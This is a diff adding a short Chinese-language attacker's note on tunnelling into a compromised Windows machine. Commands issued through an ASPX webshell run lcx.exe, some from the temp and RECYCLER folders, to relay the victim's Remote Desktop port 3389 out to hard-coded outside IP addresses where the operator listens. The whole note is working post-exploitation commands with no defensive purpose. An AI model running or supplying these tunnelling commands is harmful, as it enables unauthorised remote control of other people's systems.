@@ -1,0 +1,16 @@
+直接远程他的3389  这里传了个LCX到做转发。
+本机
+C:\>lcx.exe -listen 51 3389
+ASPX WEB
+/c c:\windows\temp\lcx.exe -slave 127.0.0.1 51 肉鸡ip 3389
+/c D:\RECYCLER\\lcx.exe -slave 219.134.229.106 23456 127.0.0.1 3389
+
+
+
+webshell里执行
+lcx.exe -slave 117.21.173.97 51 127.0.0.1 2008
+
+自己的cmd里面执行
+lcx.exe -listen 23456 3389
+
+ 
